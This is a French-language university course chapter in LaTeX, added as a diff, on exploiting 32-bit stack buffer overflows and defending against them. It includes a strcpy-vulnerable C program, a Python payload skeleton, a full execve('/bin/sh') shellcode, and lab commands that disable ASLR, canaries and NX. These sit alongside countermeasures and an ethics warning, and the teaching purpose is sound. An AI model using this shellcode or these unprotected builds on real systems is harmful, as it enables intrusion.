@@ -1,0 +1,547 @@
+\documentclass[11pt,a4paper]{article}
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[french]{babel}
+\usepackage{geometry,amsmath,hyperref,enumitem,listings}
+\usepackage[most]{tcolorbox}
+
+\geometry{margin=2.5cm}
+
+\definecolor{defcolor}{RGB}{0,102,204}
+\definecolor{warncolor}{RGB}{204,0,0}
+
+\newtcolorbox{defbox}{breakable,colback=defcolor!5!white,colframe=defcolor!75!black,title=Définition}
+\newtcolorbox{warnbox}{breakable,colback=warncolor!5!white,colframe=warncolor!75!black,title=Avertissement}
+
+\lstset{language=C,basicstyle=\ttfamily\small,breaklines=true,frame=single}
+
+\title{\textbf{Chapitre 6 : Sécurité de la Mémoire\\Buffer Overflow sur Systèmes 32-bits}}
+\author{Cours de Sécurité Informatique - Niveau Universitaire\\Partie 4 : Software Security}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+\section{Introduction}
+
+\subsection{Problématique}
+
+Les langages comme C/C++ offrent un accès direct à la mémoire mais sans vérification automatique des bornes. Cela permet des erreurs de programmation dangereuses : **buffer overflows**.
+
+\textbf{Conséquence} : Exploitation pour exécution de code arbitraire, escalade de privilèges, DoS.
+
+\subsection{Statistiques}
+
+\begin{itemize}
+    \item 70\% des vulnérabilités Microsoft (historiquement) : memory safety
+    \item CVE les plus critiques : souvent buffer overflows
+    \item Impact : Wannacry, Heartbleed, Stuxnet, etc.
+\end{itemize}
+
+\section{Organisation de la mémoire (32-bits)}
+
+\subsection{Layout mémoire d'un processus}
+
+\begin{verbatim}
+Adresses hautes
++------------------+
+|   Kernel space   |  (réservé OS)
++------------------+
+|      Stack       |  (croît vers le bas)
+|        |         |
+|        v         |
++------------------+
+|       Heap       |  (croît vers le haut)
+|        ^         |
+|        |         |
++------------------+
+|   .bss (données  |  (variables non initialisées)
+|    non init.)    |
++------------------+
+|   .data (données |  (variables globales initialisées)
+|    initialisées) |
++------------------+
+|      .text       |  (code exécutable)
++------------------+
+Adresses basses
+\end{verbatim}
+
+\subsection{Organisation de la pile (Stack)}
+
+\textbf{Chaque fonction appel crée un stack frame} :
+
+\begin{verbatim}
+Stack frame de f():
++-------------------+ <- ESP (Stack Pointer)
+| Variables locales |
++-------------------+
+| Saved EBP         | <- EBP (Base Pointer)
++-------------------+
+| Return Address    | <- Adresse de retour
++-------------------+
+| Arguments         |
++-------------------+
+\end{verbatim}
+
+\textbf{Instructions} :
+\begin{itemize}
+    \item \texttt{CALL func} : Empile return address, saute à func
+    \item \texttt{RET} : Dépile return address, saute à cette adresse
+    \item \texttt{PUSH / POP} : Manipule la pile
+\end{itemize}
+
+\section{Buffer Overflow sur la pile}
+
+\subsection{Principe}
+
+\textbf{Code vulnérable} :
+
+\begin{lstlisting}
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // Pas de vérification de taille !
+}
+
+int main(int argc, char **argv) {
+    vulnerable_function(argv[1]);
+    return 0;
+}
+\end{lstlisting}
+
+\textbf{Problème} : Si \texttt{input} > 64 bytes, débordement du buffer.
+
+\subsection{Exploitation : Écraser le return address}
+
+\textbf{Objectif} : Contrôler le return address pour rediriger l'exécution.
+
+\textbf{Analyse du stack frame} :
+
+\begin{verbatim}
+Adresses hautes
++-------------------+ <-- EBP + 8
+| Argument: input   |
++-------------------+ <-- EBP + 4
+| Return Address    | <-- Cible de l'attaque !
++-------------------+ <-- EBP
+| Saved EBP         |
++-------------------+ <-- EBP - 4
+| Variable locale 1 |
++-------------------+ <-- EBP - 8
+| ...               |
++-------------------+ <-- EBP - 72
+| buffer[64]        | <-- Début du buffer (EBP - 72)
++-------------------+ <-- ESP
+Adresses basses
+\end{verbatim}
+
+\textbf{Calcul de l'offset} :
+\begin{itemize}
+    \item Buffer démarre à : EBP - 72
+    \item Return address à : EBP + 4
+    \item Offset = (EBP + 4) - (EBP - 72) = 76 bytes
+\end{itemize}
+
+\textbf{Stratégie d'exploitation} :
+\begin{enumerate}
+    \item Écrire du shellcode dans le buffer (25 bytes)
+    \item Padding pour atteindre l'offset (76 - 25 = 51 bytes)
+    \item Écraser return address avec l'adresse du shellcode
+    \item Quand la fonction retourne (\texttt{RET}), l'instruction \texttt{pop EIP} charge notre adresse
+    \item CPU saute au shellcode → Exécution arbitraire !
+\end{enumerate}
+
+\textbf{Payload structure détaillée} :
+
+\begin{verbatim}
+[NOP sled (100 bytes)] + [Shellcode (25 bytes)] + [Padding (51 bytes)]
++ [Overwrite Saved EBP (4 bytes)] + [Return Address (4 bytes)]
+                                                   ^
+                                                   |
+                                     Pointe vers milieu du NOP sled
+\end{verbatim}
+
+\textbf{Exemple payload en Python} :
+\begin{lstlisting}[language=Python]
+import struct
+
+NOP = b"\x90"
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..." # 25 bytes
+padding = b"A" * 51
+fake_ebp = struct.pack("<I", 0x42424242)  # "BBBB"
+ret_addr = struct.pack("<I", 0xbffff500)  # Milieu NOP sled
+
+payload = NOP * 100 + shellcode + padding + fake_ebp + ret_addr
+print(payload)
+\end{lstlisting}
+
+\subsection{Shellcode}
+
+\textbf{Définition} : Code machine pour exécuter une action (ex: lancer \texttt{/bin/sh}).
+
+\textbf{Exemple x86 (Linux)} : Syscall \texttt{execve("/bin/sh")}
+
+\textbf{Code assembleur (AT\&T syntax)} :
+\begin{lstlisting}[language={[x86masm]Assembler}]
+    xor    %eax,%eax        # EAX = 0
+    push   %eax             # NULL terminator
+    push   $0x68732f2f      # "//sh"
+    push   $0x6e69622f      # "/bin"
+    mov    %esp,%ebx        # EBX = ptr to "/bin//sh"
+    push   %eax             # argv[1] = NULL
+    push   %ebx             # argv[0] = "/bin//sh"
+    mov    %esp,%ecx        # ECX = ptr to argv
+    xor    %edx,%edx        # EDX = NULL (envp)
+    mov    $0xb,%al         # EAX = 11 (syscall execve)
+    int    $0x80            # syscall
+\end{lstlisting}
+
+\textbf{Shellcode (hex, 25 bytes)} :
+\begin{verbatim}
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+\end{verbatim}
+
+\textbf{Explication} :
+\begin{enumerate}
+    \item Construit la chaîne "/bin//sh\textbackslash 0" sur le stack
+    \item Configure registres pour syscall : EBX=path, ECX=argv, EDX=envp
+    \item EAX=11 (numéro syscall execve)
+    \item \texttt{int 0x80} invoque le noyau
+    \item Noyau exécute \texttt{execve("/bin//sh", NULL, NULL)} → Lance shell
+\end{enumerate}
+
+\textbf{Contraintes du shellcode} :
+\begin{itemize}
+    \item \textbf{Pas de bytes NULL} (\textbackslash x00) si exploit passe par \texttt{strcpy()} (s'arrête au NULL)
+    \item \textbf{Position-independent} : Doit fonctionner quelle que soit son adresse
+    \item \textbf{Taille minimale} : Plus c'est court, plus facile à injecter
+    \item \textbf{Pas de bad chars} : Certains caractères peuvent être filtrés (\textbackslash n, \textbackslash r, etc.)
+\end{itemize}
+
+\textbf{Variantes de shellcode} :
+\begin{itemize}
+    \item \textbf{Bind shell} : Ouvre un port et écoute
+    \item \textbf{Reverse shell} : Connecte vers attaquant
+    \item \textbf{Staged shellcode} : Petit loader qui télécharge payload complet
+    \item \textbf{Polymorphic shellcode} : Change de forme à chaque exécution (IDS evasion)
+\end{itemize}
+
+\textbf{Outils de génération} :
+\begin{itemize}
+    \item \texttt{msfvenom} (Metasploit) : Génère shellcodes pour toutes plateformes
+    \item \texttt{pwntools} (Python) : Framework d'exploitation
+    \item \texttt{shellcraft} : Génère shellcodes assembleur
+\end{itemize}
+
+\subsection{Déterminer l'adresse de retour}
+
+\textbf{Méthode 1} : Debugger (gdb)
+\begin{verbatim}
+gdb ./vulnerable
+(gdb) break vulnerable_function
+(gdb) run $(python -c 'print "A"*100')
+(gdb) x/100x $esp  # Examiner la pile
+\end{verbatim}
+
+\textbf{Méthode 2} : NOP sled (glissière de NOPs)
+\begin{itemize}
+    \item Préfixer shellcode par beaucoup de \texttt{NOP} (\textbackslash x90)
+    \item Viser approximativement au milieu
+    \item Si on atterrit sur un NOP, glisse jusqu'au shellcode
+\end{itemize}
+
+\begin{verbatim}
+[NOPs x 100] + [Shellcode] + [Padding] + [Adresse dans NOPs]
+\end{verbatim}
+
+\section{Contre-mesures}
+
+\subsection{Programmation sécurisée}
+
+\begin{itemize}
+    \item \textbf{Éviter fonctions dangereuses} : \texttt{strcpy}, \texttt{gets}, \texttt{sprintf}
+    \item \textbf{Utiliser versions sûres} : \texttt{strncpy}, \texttt{fgets}, \texttt{snprintf}
+    \item \textbf{Vérifier bornes} : Toujours valider taille inputs
+    \item \textbf{Static analysis} : Outils comme Coverity, Clang Static Analyzer
+\end{itemize}
+
+\subsection{Stack Canaries}
+
+\textbf{Principe} : Placer une valeur aléatoire (canary) entre buffer et return address.
+
+\begin{verbatim}
+Stack frame avec canary:
++-------------------+
+| Variables locales |
++-------------------+
+| Stack Canary      | <- Valeur aléatoire secrète
++-------------------+
+| Saved EBP         |
++-------------------+
+| Return Address    |
++-------------------+
+\end{verbatim}
+
+\textbf{Mécanisme} : Avant de retourner, vérifier que le canary n'a pas changé. Si modifié, crasher le programme.
+
+\textbf{Activation} : GCC avec \texttt{-fstack-protector} ou \texttt{-fstack-protector-all}
+
+\textbf{Contournement} : Si attaquant peut lire le canary (info leak), il peut le préserver.
+
+\subsection{NX bit (Data Execution Prevention)}
+
+\textbf{Principe} : Marquer la pile comme non-exécutable.
+
+\textbf{Effet} : Même si attaquant injecte shellcode, ne pourra pas l'exécuter.
+
+\textbf{Hardware support} : CPU moderne (NX bit x86, XD bit Intel, XN bit ARM)
+
+\textbf{OS} : Windows DEP, Linux NX
+
+\textbf{Contournement} : Return-Oriented Programming (ROP) - réutiliser code existant.
+
+\subsection{ASLR (Address Space Layout Randomization)}
+
+\textbf{Principe} : Randomiser les adresses mémoire à chaque exécution.
+
+\textbf{Zones randomisées} : Stack, heap, bibliothèques, exécutable (PIE)
+
+\textbf{Effet} : Attaquant ne peut pas prédire où placer son shellcode ou quelle adresse cibler.
+
+\textbf{Activation} :
+\begin{verbatim}
+Linux: echo 2 > /proc/sys/kernel/randomize_va_space
+Windows: ASLR activé par défaut depuis Vista
+\end{verbatim}
+
+\textbf{Contournement} : Info leaks (révéler adresses), brute force (32-bits), ROP.
+
+\subsection{Compilation avec protections}
+
+\begin{verbatim}
+gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -fPIE -pie \
+    -Wl,-z,relro,-z,now -o program program.c
+\end{verbatim}
+
+\begin{itemize}
+    \item \texttt{-fstack-protector-all} : Stack canaries
+    \item \texttt{-fPIE -pie} : Position Independent Executable (ASLR)
+    \item \texttt{-Wl,-z,relro,-z,now} : Read-only GOT/PLT
+    \item \texttt{-D_FORTIFY_SOURCE=2} : Runtime checks
+\end{itemize}
+
+\section{Techniques avancées d'exploitation}
+
+\subsection{Return-Oriented Programming (ROP)}
+
+\textbf{Contexte} : NX activé, impossible d'exécuter shellcode injecté.
+
+\textbf{Idée} : Chaîner des "gadgets" (petits bouts de code se terminant par \texttt{RET}).
+
+\textbf{Gadget} :
+\begin{verbatim}
+pop eax ; ret   # Gadget 1
+pop ebx ; ret   # Gadget 2
+int 0x80 ; ret  # Gadget 3 (syscall)
+\end{verbatim}
+
+\textbf{Payload ROP} :
+\begin{verbatim}
+[Padding] + [Addr Gadget1] + [Data] + [Addr Gadget2] + ...
+\end{verbatim}
+
+\textbf{Outils} : ROPgadget, pwntools
+
+\subsection{Heap overflow}
+
+\textbf{Principe} : Débordement sur le tas (heap) au lieu de la pile.
+
+\textbf{Exploitation} : Plus complexe, cible métadonnées malloc/free.
+
+\textbf{Techniques} : Use-After-Free, Double-Free, Heap spraying.
+
+\section{Langages sûrs et alternatives}
+
+\begin{warnbox}
+\textbf{La vraie solution} : Utiliser des langages memory-safe.
+
+\textbf{Langages sans buffer overflows} :
+\begin{itemize}
+    \item \textbf{Rust} : Ownership, borrow checker (sécurité à la compilation)
+    \item \textbf{Go} : Garbage collection, vérification bornes
+    \item \textbf{Python, Java, C\#} : Managed memory
+\end{itemize}
+
+\textbf{Tendance industrie} : Migration progressive vers Rust (ex: Microsoft, Google, Linux kernel).
+\end{warnbox}
+
+\section{Travaux pratiques}
+
+\subsection{Exercices théoriques}
+
+\begin{enumerate}
+    \item \textbf{Analyse de stack frame} : Dessiner le stack frame d'une fonction avec buffer de 128 bytes et identifier où se trouve le return address. Calculer l'offset.
+
+    \item \textbf{Calcul d'offset} : Pour un buffer de 64 bytes, sachant que le saved EBP est à 4 bytes après le buffer, calculer l'offset total pour écraser le return address.
+
+    \item \textbf{Limitations NX} : Expliquer pourquoi NX seul n'est pas suffisant. Décrire le principe de ROP.
+
+    \item \textbf{Defense in depth} : Décrire comment ASLR + stack canaries + NX combinés renforcent la sécurité. Quelle combinaison d'attaques faudrait-il pour bypasser toutes ces protections ?
+
+    \item \textbf{Shellcode analysis} : Analyser le shellcode suivant et expliquer ce qu'il fait :
+    \begin{verbatim}
+    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+    \x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+    \end{verbatim}
+
+    \item \textbf{Bad characters} : Pourquoi les bytes NULL (\textbackslash x00) sont-ils problématiques dans un exploit utilisant \texttt{strcpy()} ? Comment contourner cette limitation ?
+
+    \item \textbf{Comparaison langages} : Comparer C, C++ et Rust du point de vue de la memory safety. Quels mécanismes Rust utilise-t-il pour prévenir les buffer overflows ?
+\end{enumerate}
+
+\subsection{Exercices pratiques}
+
+Les notebooks suivants implémentent et explorent les concepts de ce chapitre :
+
+\begin{itemize}
+    \item \texttt{06\_demo\_buffer\_overflow.ipynb} : Simulation buffer overflow avec visualization
+\end{itemize}
+
+\textbf{Exercices proposés} :
+\begin{enumerate}
+    \item \textbf{Buffer overflow basique} : Compiler un programme vulnérable et l'exploiter pour lancer un shell
+    \begin{verbatim}
+    gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
+    ./vuln $(python3 -c 'print("A"*76 + "\xef\xbe\xad\xde")')
+    \end{verbatim}
+
+    \item \textbf{Déterminer offset} : Utiliser gdb ou pattern\_create de Metasploit pour trouver l'offset exact
+    \begin{verbatim}
+    gdb ./vuln
+    (gdb) run $(python3 -c 'print("A"*100)')
+    (gdb) x/20x $esp
+    \end{verbatim}
+
+    \item \textbf{Tester protections} : Compiler avec différentes options et observer l'effet
+    \begin{verbatim}
+    # Sans protections
+    gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln_unsafe
+
+    # Avec stack canary
+    gcc -fstack-protector-all vuln.c -o vuln_canary
+
+    # Avec NX
+    gcc -z noexecstack vuln.c -o vuln_nx
+
+    # Toutes protections
+    gcc -fstack-protector-all -fPIE -pie -z now -z relro vuln.c -o vuln_safe
+    \end{verbatim}
+
+    \item \textbf{Analyse avec checksec} : Vérifier les protections actives
+    \begin{verbatim}
+    checksec --file=./vuln
+    # Output: Canary, NX, PIE, RELRO status
+    \end{verbatim}
+
+    \item \textbf{ROP Chain simple} : Utiliser ROPgadget pour trouver des gadgets et construire une chaîne ROP
+    \begin{verbatim}
+    ROPgadget --binary /bin/ls --ropchain
+    \end{verbatim}
+\end{enumerate}
+
+\textbf{Environnement recommandé} :
+\begin{itemize}
+    \item VM Linux 32-bits (ou chroot 32-bits sur 64-bits)
+    \item Distribution : Ubuntu 18.04 ou Debian 10
+    \item Protections désactivées pour apprentissage : \texttt{echo 0 > /proc/sys/kernel/randomize\_va\_space}
+\end{itemize}
+
+\begin{warnbox}
+\textbf{Avertissement éthique et légal} :
+
+Ces techniques sont enseignées exclusivement à des fins éducatives et défensives. L'exploitation de vulnérabilités sans autorisation explicite est \textbf{illégale} dans la plupart des juridictions.
+
+\textbf{Usage autorisé} :
+\begin{itemize}
+    \item CTF (Capture The Flag) competitions
+    \item Environnements de lab contrôlés (VMs isolées)
+    \item Pentest avec contrat et périmètre défini
+    \item Bug bounty programs (HackerOne, Bugcrowd)
+\end{itemize}
+
+\textbf{Principe} : "Comprendre pour mieux protéger"
+\end{warnbox}
+
+\section{Ressources complémentaires}
+
+\subsection{Livres et articles fondateurs}
+
+\begin{itemize}
+    \item \textbf{Aleph One (1996)} : "Smashing The Stack For Fun And Profit" (Phrack Magazine)
+    \item \textbf{Anley et al. (2007)} : \textit{The Shellcoder's Handbook}
+    \item \textbf{Erickson (2008)} : \textit{Hacking: The Art of Exploitation}
+    \item \textbf{Dowd, McDonald, Schuh (2006)} : \textit{The Art of Software Security Assessment}
+\end{itemize}
+
+\subsection{Outils pratiques}
+
+\textbf{Exploitation} :
+\begin{itemize}
+    \item \textbf{gdb} : Debugger (avec plugin pwndbg ou gef)
+    \item \textbf{pwntools} : Framework Python pour exploitation
+    \item \textbf{ROPgadget} : Recherche de gadgets ROP
+    \item \textbf{Metasploit} : Framework complet (msfvenom pour shellcodes)
+    \item \textbf{radare2} : Reverse engineering et exploitation
+\end{itemize}
+
+\textbf{Analyse} :
+\begin{itemize}
+    \item \textbf{checksec} : Vérifie protections binaires
+    \item \textbf{ltrace/strace} : Trace appels librairie/système
+    \item \textbf{Valgrind} : Détecte erreurs mémoire
+    \item \textbf{AddressSanitizer (ASan)} : Détecte buffer overflows à runtime
+\end{itemize}
+
+\subsection{Platforms d'apprentissage}
+
+\begin{itemize}
+    \item \textbf{pwnable.kr} : Challenges buffer overflow progressifs
+    \item \textbf{exploit.education} : Environnements Nebula, Protostar, Fusion
+    \item \textbf{picoCTF} : CTF éducatif (Carnegie Mellon)
+    \item \textbf{ROP Emporium} : Apprentissage ROP guidé
+    \item \textbf{pwnable.tw} : Challenges avancés
+\end{itemize}
+
+\subsection{Lectures recommandées}
+
+\begin{itemize}
+    \item OWASP : Buffer Overflow Prevention Cheat Sheet
+    \item CWE-119 : Improper Restriction of Operations within the Bounds of a Memory Buffer
+    \item MITRE ATT\&CK : Exploitation for Client Execution (T1203)
+    \item Microsoft SDL : Secure Development Lifecycle
+    \item Google Project Zero Blog : Vulnérabilités zero-day
+\end{itemize}
+
+\section{Conclusion}
+
+\textbf{Points clés} :
+\begin{itemize}
+    \item Buffer overflows : exploitation classique mais toujours dangereuse
+    \item Défenses : Stack canaries, NX, ASLR (défense en profondeur)
+    \item ROP : Technique avancée pour contourner NX
+    \item Solution long terme : Langages memory-safe (Rust, Go)
+\end{itemize}
+
+\textbf{Évolution} : Exploitation de plus en plus difficile grâce aux protections modernes, mais toujours possible (complexité accrue).
+
+\vspace{1cm}
+\begin{center}
+\textit{"The best way to learn security is to break things (legally)."} \\
+— Principe du hacking éthique
+\end{center}
+
+\end{document}
